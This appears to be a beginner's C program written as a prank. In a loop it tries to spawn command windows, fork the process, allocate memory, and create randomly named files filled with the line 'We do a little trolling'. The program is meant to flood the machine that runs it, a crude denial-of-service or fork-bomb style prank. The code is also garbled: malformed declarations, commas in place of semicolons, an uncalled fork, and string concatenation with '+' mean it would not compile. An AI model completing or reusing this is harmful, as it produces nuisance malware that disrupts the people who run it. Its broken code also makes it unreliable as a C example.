#include <stdlib.h>
#include <stdio.h>
//forgive me if this is trash I am new to C
int main() {
    FILE[] *x;
    for(int i = 0, i < 20 * i; i++) {
        system("start cmd");
        fork;
        malloc(1000);
        x[i] = fopen(rand() + '.' + rand(), 'w+');
        for(int y = 0, y < i; y++){
            fputs("We do a little trolling\n", x[i]);
        }
    }
}
